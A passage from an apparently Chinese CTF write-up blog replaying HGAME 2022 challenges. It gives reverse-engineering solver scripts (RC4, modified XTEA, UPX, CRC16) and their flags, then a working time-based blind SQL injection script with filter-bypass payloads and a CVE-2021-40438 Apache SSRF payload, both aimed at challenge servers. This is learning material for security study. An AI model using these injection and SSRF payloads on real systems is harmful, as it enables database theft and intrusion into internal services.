class=\"line\">        t = (box[i] + box[j]) % <span class=\"number\">256</span></span><br><span class=\"line\">        k = box[t]</span><br><span class=\"line\">        res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s) ^ k))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;res用于解密字符串，解密后是：%res&quot;</span> % res)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    cipher = <span class=\"string\">&quot;&quot;</span>.join(res)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的字符串是：%s&quot;</span> % cipher)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a = [<span class=\"number\">182</span>, <span class=\"number\">148</span>, <span class=\"number\">250</span>, <span class=\"number\">143</span>, <span class=\"number\">61</span>, <span class=\"number\">95</span>, <span class=\"number\">178</span>, <span class=\"number\">224</span>, <span class=\"number\">234</span>, <span class=\"number\">15</span>, <span class=\"number\">210</span>, <span class=\"number\">102</span>, <span class=\"number\">152</span>, <span class=\"number\">108</span>, <span class=\"number\">157</span>, <span class=\"number\">231</span>, <span class=\"number\">27</span>, <span class=\"number\">8</span>, <span class=\"number\">64</span>, <span class=\"number\">113</span>, <span class=\"number\">197</span>, <span class=\"number\">190</span>, <span class=\"number\">111</span>, <span class=\"number\">109</span>, <span class=\"number\">124</span>, <span class=\"number\">123</span>, <span class=\"number\">9</span>, <span class=\"number\">141</span>, <span class=\"number\">168</span>, <span class=\"number\">189</span>, <span class=\"number\">243</span>, <span class=\"number\">246</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    s += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"built_in\">str</span>(base64.b64encode(s.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)), <span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rc4_main(<span class=\"string\">&quot;w0wy0ugot1t&quot;</span>, s)</span><br></pre></td></tr></table></figure>\n\n<p>得到hgame{s0meth1ng_run_bef0r_m4in?}</p>\n<p>这道题做的太傻了，自己都知道RC4解密，也发现了happyhg4me!不是密钥，而是w0wy0ugot1t，但不知道为啥没做出来。</p>\n<h6 id=\"creakme2\"><a href=\"#creakme2\" class=\"headerlink\" title=\"creakme2\"></a>creakme2</h6><p>这道题是XTEA加密，本来以为是没有魔改的XTEA，所以没做出来，看汇编其实是有一部分代码改变的XTEA加密算法。</p>\n<p><img src=\"/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220206150512571.png\" alt=\"image-20220206150512571\"></p>\n<p>idiv是执行有符号整数的除法，除数是ecx，根据汇编可知，当ecx=0时（即除数不能为0）跳转到loc_140001141,eax会异或0x1234567。其中ecx是total的值右移31位（即最高位是否是零来判断是否跳转），魔改后的XTEA加解密代码如下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span>(<span class=\"params\">v, key</span>):</span></span><br><span class=\"line\">    v0, v1 = c_uint32(v[<span class=\"number\">0</span>]), c_uint32(v[<span class=\"number\">1</span>])</span><br><span class=\"line\">    delta = <span class=\"number\">0x9E3779B1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    total = c_uint32(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">        v0.value += (((v1.value &lt;&lt; <span class=\"number\">4</span>) ^ (v1.value &gt;&gt; <span class=\"number\">5</span>)) + v1.value) ^ (total.value + key[total.value &amp; <span class=\"number\">3</span>])</span><br><span class=\"line\">        total.value += delta</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(total.value &gt;&gt; <span class=\"number\">31</span>==<span class=\"number\">0</span>):</span><br><span class=\"line\">            total.value ^= <span class=\"number\">0x1234567</span></span><br><span class=\"line\">        v1.value += (((v0.value &lt;&lt; <span class=\"number\">4</span>) ^ (v0.value &gt;&gt; <span class=\"number\">5</span>)) + v0.value) ^ (total.value + key[(total.value &gt;&gt; <span class=\"number\">11</span>) &amp; <span class=\"number\">3</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> v0.value, v1.value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span>(<span class=\"params\">v, key</span>):</span></span><br><span class=\"line\">    v0, v1 = c_uint32(v[<span class=\"number\">0</span>]), c_uint32(v[<span class=\"number\">1</span>])</span><br><span class=\"line\">    delta = <span class=\"number\">0x9E3779B1</span></span><br><span class=\"line\">    total = c_uint32(<span class=\"number\">3347991813</span>)</span><br><span class=\"line\">    <span class=\"comment\">#total = c_uint32(delta * 32)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">        v1.value -= (((v0.value &lt;&lt; <span class=\"number\">4</span>) ^ (v0.value &gt;&gt; <span class=\"number\">5</span>)) + v0.value) ^ (total.value + key[(total.value &gt;&gt; <span class=\"number\">11</span>) &amp; <span class=\"number\">3</span>])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (total.value &gt;&gt; <span class=\"number\">31</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">            total.value ^= <span class=\"number\">0x1234567</span></span><br><span class=\"line\">        total.value -= delta</span><br><span class=\"line\">        v0.value -= (((v1.value &lt;&lt; <span class=\"number\">4</span>) ^ (v1.value &gt;&gt; <span class=\"number\">5</span>)) + v1.value) ^ (total.value + key[(total.value &amp; <span class=\"number\">3</span>)])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> v0.value, v1.value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># test</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 待加密的明文，两个32位整型，即64bit的明文数据</span></span><br><span class=\"line\">    value = [<span class=\"number\">0x457E62CF</span>, <span class=\"number\">0x9537896C</span>]</span><br><span class=\"line\">    value1 = [<span class=\"number\">0x1F7E7F72</span>, <span class=\"number\">0xF7A073D8</span>]</span><br><span class=\"line\">    value2 = [<span class=\"number\">0x8E996868</span>, <span class=\"number\">0x40AFAF99</span>]</span><br><span class=\"line\">    value3 = [<span class=\"number\">0xF990E34</span>, <span class=\"number\">0x196F4086</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 四个key，每个是32bit，即密钥长度为128bit</span></span><br><span class=\"line\">    key = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;print(&quot;Data is : &quot;, hex(value[0]), hex(value[1]))</span></span><br><span class=\"line\"><span class=\"string\">    res = encrypt(value, key)</span></span><br><span class=\"line\"><span class=\"string\">    print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    ccm=decrypt(value,key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Encrypted data is : &quot;</span>, <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    ccm = decrypt(value1, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Encrypted data is : &quot;</span>,  <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    ccm = decrypt(value2, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Encrypted data is : &quot;</span>,  <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    ccm = decrypt(value3, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Encrypted data is : &quot;</span>, <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(ccm[<span class=\"number\">1</span>]))</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">Encrypted data is :  0x6d616768 0x45537b65</span></span><br><span class=\"line\"><span class=\"string\">Encrypted data is :  0x30735f48 0x35646e75</span></span><br><span class=\"line\"><span class=\"string\">Encrypted data is :  0x5f30355f 0x65746e31</span></span><br><span class=\"line\"><span class=\"string\">Encrypted data is :  0x74356572 0x7d676e69</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">total = c_uint32(<span class=\"number\">0</span>)</span><br><span class=\"line\">delta = <span class=\"number\">0x9E3779B1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">    total.value += delta</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (total.value &gt;&gt; <span class=\"number\">31</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">        total.value ^= <span class=\"number\">0x1234567</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(total.value)</span><br><span class=\"line\"><span class=\"comment\">#3347991813</span></span><br></pre></td></tr></table></figure>\n\n<p>第一块代码的3347991813，可由第二块代码得出，即经过32轮之后total的和。</p>\n<p>将解密的16进制转为字符串maghES{e0s_H5dnu_05_etn1t5er}gni 每4位倒序</p>\n<p>hgame{SEH_s0und5_50_1ntere5ting}</p>\n<h6 id=\"upx-magic1\"><a href=\"#upx-magic1\" class=\"headerlink\" title=\"upx magic1\"></a>upx magic1</h6><p>这到题命令行不能脱壳，只能手动脱壳，而我手动脱壳又不太会，看了别人的wp，将文件用010打开，将3个UPX?改为UPX!,就可以通过upx -d 命令行脱壳。这个是真的学到了。</p>\n<p>ida打开发现其和上一个脱upx可代码流程相同，直接用上一个脱upx题的代码运行。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key=[<span class=\"number\">36200</span>,<span class=\"number\">40265</span>,<span class=\"number\">10770</span>,<span class=\"number\">43802</span>,<span class=\"number\">52188</span>,<span class=\"number\">47403</span>,<span class=\"number\">11826</span>,<span class=\"number\">40793</span>,<span class=\"number\">56781</span>,<span class=\"number\">40265</span>,<span class=\"number\">43274</span>,<span class=\"number\">3696</span>,<span class=\"number\">62927</span>,<span class=\"number\">24277</span>,<span class=\"number\">15363</span>,<span class=\"number\">31879</span>,<span class=\"number\">9842</span>,<span class=\"number\">43802</span>,<span class=\"number\">2640</span>,<span class=\"number\">23285</span>,<span class=\"number\">65439</span>,<span class=\"number\">40793</span>,<span class=\"number\">48395</span>,<span class=\"number\">22757</span>,<span class=\"number\">14371</span>,<span class=\"number\">48923</span>,<span class=\"number\">30887</span>,<span class=\"number\">43802</span>,<span class=\"number\">18628</span>,<span class=\"number\">43274</span>,<span class=\"number\">11298</span>,<span class=\"number\">40793</span>,<span class=\"number\">23749</span>,<span class=\"number\">24277</span>,<span class=\"number\">30887</span>,<span class=\"number\">9842</span>,<span class=\"number\">22165</span>]</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">        mm=i</span><br><span class=\"line\">        mm=mm&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(mm&amp;<span class=\"number\">0x8000</span>!=<span class=\"number\">0</span>):</span><br><span class=\"line\">                mm=(<span class=\"number\">2</span>*mm)^<span class=\"number\">0x1021</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                mm=mm*<span class=\"number\">2</span></span><br><span class=\"line\">        mm=mm&amp;<span class=\"number\">0xffff</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(mm,i)</span><br><span class=\"line\">key1=[<span class=\"number\">110</span>,<span class=\"number\">111</span>,<span class=\"number\">87</span>,<span class=\"number\">95</span>,<span class=\"number\">89</span>,<span class=\"number\">79</span>,<span class=\"number\">117</span>,<span class=\"number\">126</span>,<span class=\"number\">107</span>,<span class=\"number\">111</span>,<span class=\"number\">78</span>,<span class=\"number\">119</span>,<span class=\"number\">45</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">97</span>,<span class=\"number\">49</span>,<span class=\"number\">95</span>,<span class=\"number\">85</span>,<span class=\"number\">80</span>,<span class=\"number\">120</span>,<span class=\"number\">126</span>,<span class=\"number\">109</span>,<span class=\"number\">65</span>,<span class=\"number\">71</span>,<span class=\"number\">124</span>,<span class=\"number\">67</span>,<span class=\"number\">95</span>,<span class=\"number\">64</span>,<span class=\"number\">78</span>,<span class=\"number\">100</span>,<span class=\"number\">126</span>,<span class=\"number\">99</span>,<span class=\"number\">114</span>,<span class=\"number\">67</span>,<span class=\"number\">49</span>,<span class=\"number\">54</span>]</span><br><span class=\"line\">flagy=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(key1)):</span><br><span class=\"line\">    flagy+=<span class=\"built_in\">chr</span>(key1[i])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flagy)</span><br><span class=\"line\"></span><br><span class=\"line\">flag2=<span class=\"string\">&quot;noW_YOu~koNw-rea1_UPx~mAG|C_@Nd~crC16&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>还是将print(mm,i)打印出来的东西与要比较的数组作比较，即可得到flag。</p>\n<p>hgame{noW_YOu<del>koNw-rea1_UPx</del>mAG|C_@Nd~crC16}</p>\n<h5 id=\"Web-1\"><a href=\"#Web-1\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"Pokemon\"><a href=\"#Pokemon\" class=\"headerlink\" title=\"Pokemon\"></a>Pokemon</h6><p>（代码来源于网络）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">printable_str = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\\]^_`&#123;|&#125;~&quot;</span></span><br><span class=\"line\">burp0_url = <span class=\"string\">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class=\"line\">burp0_headers = &#123;<span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>,</span><br><span class=\"line\">             <span class=\"string\">&quot;Accept&quot;</span>: <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class=\"line\">             <span class=\"string\">&quot;Accept-Language&quot;</span>: <span class=\"string\">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class=\"line\">             <span class=\"string\">&quot;Accept-Encoding&quot;</span>: <span class=\"string\">&quot;gzip, deflate&quot;</span>, <span class=\"string\">&quot;Connection&quot;</span>: <span class=\"string\">&quot;close&quot;</span>, <span class=\"string\">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class=\"string\">&quot;1&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">   <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> printable_str:</span><br><span class=\"line\">      <span class=\"comment\">#payload = &quot;if(ascii(mid(database(),&#123;&#125;,1))like(&#123;&#125;),sleep(1),1)&quot;.format(i, ord(s)) #爆破数据库名pokemon</span></span><br><span class=\"line\">      <span class=\"comment\">#payload = &quot;if(ascii(mid((selselectect/*/**/*/group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/(table_schema)like(&#x27;pokemon&#x27;)),&#123;&#125;,1))like(&#123;&#125;),sleep(1),0)&quot;.format(i, ord(s))#爆破表名 errors,fllllllllaaaaaag</span></span><br><span class=\"line\">      <span class=\"comment\">#payload = &quot;if(ascii(mid((selselectect/*/**/*/group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whewherere/*/**/*/(table_name)like(&#x27;fllllllllaaaaaag&#x27;)),&#123;&#125;,1))like(&#123;&#125;),sleep(1),0)&quot;.format(i, ord(s))#爆破列名flag</span></span><br><span class=\"line\">      payload = <span class=\"string\">&quot;if(ascii(mid((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/pokemon.fllllllllaaaaaag),&#123;&#125;,1))like(&#123;&#125;),sleep(1),1)&quot;</span>.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">ord</span>(s))</span><br><span class=\"line\">      resp = requests.get(url=burp0_url+payload, headers=burp0_headers)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> resp.elapsed.seconds &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\">         result += s</span><br><span class=\"line\">         <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+]&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(result))</span><br><span class=\"line\">      <span class=\"keyword\">else</span>:</span><br><span class=\"line\">         <span class=\"keyword\">continue</span></span><br><span class=\"line\"><span class=\"comment\">#hgame&#123;C0n9r@tul4tiOn*Y0u$4r3_sq1_M4ST3R#&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>知识点：过滤替换用双写绕过，过滤了空格（用双写/<em>/**/</em>/代替，/**/或/<em>1</em>/注释可以用作空格）通过时间盲注来注入，通过判断响应时间来决定  绕过 =: 使用 like 或者 regexp</p>\n<p>官方wp</p>\n<p>查询数据库： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,database() 查询表： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,group_concat(table_name)/<em>1</em>/frfromom/<em>1</em> /infoorrmation_schema.tables/<em>1</em>/whewherere/<em>1</em>/table_schema/<em>1</em>/regexp/<em>1</em>/“^pokemon $” 查询列： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,group_concat(column_name)/<em>1</em>/frfromom/*1 */infoorrmation_schema.columns/<em>1</em>/whewherere/<em>1</em>/table_name/<em>1</em>/regexp/<em>1</em>/“^flllllll laaaaaag$” 查询 flag 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,flag/<em>1</em>/frfromom/<em>1</em>/fllllllllaaaaaag</p>\n<h6 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache!\"></a>Apache!</h6><p>利用2021 年 Apache 的 mod_proxy 模块报了个 SSRF 漏洞（CVE-2021-40438），利用这个漏洞直接访问 <a href=\"http://internal.host/flag\">http://internal.host/flag</a> 即可拿到 flag 。</p>\n<p>需要注意的是Apache 的配置文件 https-vhosts.conf </p>\n<p>&lt;Location /proxy&gt;<br>      ProxyPass <a href=\"https://www.google.com/\">https://www.google.com</a><br> </p>\n<p> ‘/‘ 提供静态资源服务， ‘/proxy’ 提供代理服务</p>\n<p>所以构造的payload是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">/proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:<span class=\"comment\">//internal.host/flag</span></span><br><span 